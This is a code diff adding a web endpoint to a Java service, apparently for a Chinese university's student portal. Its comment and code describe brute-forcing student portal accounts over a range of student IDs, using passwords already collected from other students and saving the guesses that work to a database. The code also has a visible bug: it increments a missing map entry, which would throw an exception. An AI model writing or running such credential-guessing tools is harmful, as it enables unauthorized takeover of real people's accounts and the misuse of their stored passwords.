@@ -7,15 +7,22 @@
 package tool.ccnu.student;
 
 import org.glassfish.jersey.server.JSONP;
+import org.hibernate.Query;
+import org.hibernate.Session;
 import tool.HibernateUtil;
 import tool.R;
 import tool.Tool;
 import tool.ccnu.CCNUPortal;
+import tool.ccnu.student.detailInfo.StudentAllInfoEntity;
 
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import javax.ws.rs.*;
 import javax.ws.rs.core.Context;
+import java.util.HashMap;
+import java.util.LinkedList;
+import java.util.List;
+import java.util.Map;
 
 /**
  * Created with Intellij IDEA.
@@ -105,6 +112,41 @@ public class ServiceStudents {
 		if (start == null || end == null || pass == null || start.length() != 10 || end.length() != 10) return 0;
 		String pa[] = pass.split(",");
 		return ManageStudents.scanPassword(Integer.parseInt(start), Integer.parseInt(end), pa);
+	}
+
+	/**
+	 * 先去已经存在的所有密码中找出出现了1次以上的密码,再使用这些密码去探测
+	 * 暴力破解信息门户账号密码
+	 * 猜对的会保存到数据库中
+	 *
+	 * @param start 开始的学号
+	 * @param end   结束的学号
+	 * @return 成功猜对的个数
+	 */
+	@JSONP(queryParam = R.JSONP_CALLBACK)
+	@GET
+	@Path("/scanCommonPassword")
+	public int scanCommonPassword(@QueryParam("start") String start, @QueryParam("end") String end) {
+		Session session = HibernateUtil.getSession();
+		Query query = session.createQuery("from StudentAllInfoEntity where password!=null ");
+		List<StudentAllInfoEntity> allInfoEntities = query.list();
+		HibernateUtil.closeSession(session);
+		Map<String, Integer> pass = new HashMap<>();
+		for (StudentAllInfoEntity one : allInfoEntities) {
+			String password = one.getPassword();
+			pass.put(password, pass.get(password) + 1);
+		}
+		List<String> commonPassword = new LinkedList<>();
+		for (Map.Entry<String, Integer> one : pass.entrySet()) {
+			if (one.getValue() > 0) {
+				commonPassword.add(one.getKey());
+			}
+		}
+		String[] commonPasswordArray = new String[commonPassword.size()];
+		for (int i = 0; i < commonPassword.size(); i++) {
+			commonPasswordArray[i] = commonPassword.get(i);
+		}
+		return ManageStudents.scanPassword(Integer.parseInt(start), Integer.parseInt(end), commonPasswordArray);
 	}
 
 
